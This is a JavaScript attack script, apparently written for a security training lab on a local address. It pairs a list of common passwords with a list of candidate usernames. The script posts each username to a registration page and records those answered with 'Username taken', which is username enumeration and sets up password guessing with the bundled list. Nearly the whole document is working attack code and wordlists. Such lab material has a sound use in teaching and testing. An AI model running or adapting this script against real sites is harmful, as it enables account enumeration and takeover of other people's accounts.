passwords = `123456
porsche
firebird
prince
rosebud
password
guitar
butter
beach
jaguar
12345678
chelsea
united
amateur
great
1234
black
turtle
7777777
cool
pussy
diamond
steelers
muffin
cooper
12345
nascar
tiffany
redsox
1313
dragon
jackson
zxcvbn
star
scorpio
qwerty
cameron
tomcat
testing
mountain
696969
654321
golf
shannon
madison
mustang
computer
bond007
murphy
987654
letmein`.split('\n');

usernames = `aaatam
AAATREEBOY
aaawsome2
aab1234567890
aaberg
aabisha
aa_broom
achuth
acicula
acicular
aciculate
aciculum
acid
acid1212
acidargyle
AcidDawn
AcidDragon
acidfast
acidforming
Acid_Grin
acidhead
acidic
acidic7
Acidically
AcidicAngle
AcidicBeast
acidicblitzz
AcidicCraft
AcidicIronTooth
acidicparasite
bailable
bailar
bailboy91
Bailee
Bailee_Waid
bailer007
bailes
bailey
Bailey_
Bailey0799
bailey123123123
BAILEY16
Bailey_18
bailey531
bailey5613
bailey60558
bailey713
baileyajayi
baileybailie
baileybanks58
Bailey_Boo
BaileyBunch
baileycool1
baileycphy
baileydebortoli
baileyemili
BaileyHazeldine
bailey_ingram
BaileyKouw
BaileyLeConte
baileym12
callmehere
callmehoptimus
CallMehSweet
CallMeKaleb
CallMeTuesdays
callmetuny
CallMeVideo
callob
call_of_cheese
callofcheese900
CallofDuty
CallOfDuty1295
Call_of_Duty2015
call_of_duty47
callofdutychick
callofdutydude
callofdutykilr
callofett65
callofMntDewty
Callofmygun
CallOfRolli
CallOfSeak
callofthedead98
callofthedeadz2
callosity
callous
callow
calloway
callrocks
CallsignStreak
CallSkyhawk
Callstrike
calltopower1
callu123
callum`.split('\n');

const form = document.getElementsByName('login')[0];
const usernameField = document.getElementsByName('username')[0];
const passwordField = document.getElementsByName('password')[0];
const correctUsernames = [];
url = 'http://192.168.64.3/Decamp/Chapter6/lab1/registration.php';

for (let i = 0; i < usernames.length; i++) {
  fd = new FormData();

  data = {
    username: usernames[i],
    email: 'dummy@email.com',
    password: 'dummypassword',
    submit: 'Login',
  };

  for (const [name, value] of Object.entries(data)) {
    fd.append(name, value);
  }

  try {
    const response = await fetch(url, {
      method: 'POST',
      body: fd,
    });

    const responseData = await response.text();
    if (responseData.includes('Username taken')) {
      correctUsernames.push(usernames[i]);
    } else {
      console.log('.');
    }
  } catch (error) {
    console.error(error);
  }
}
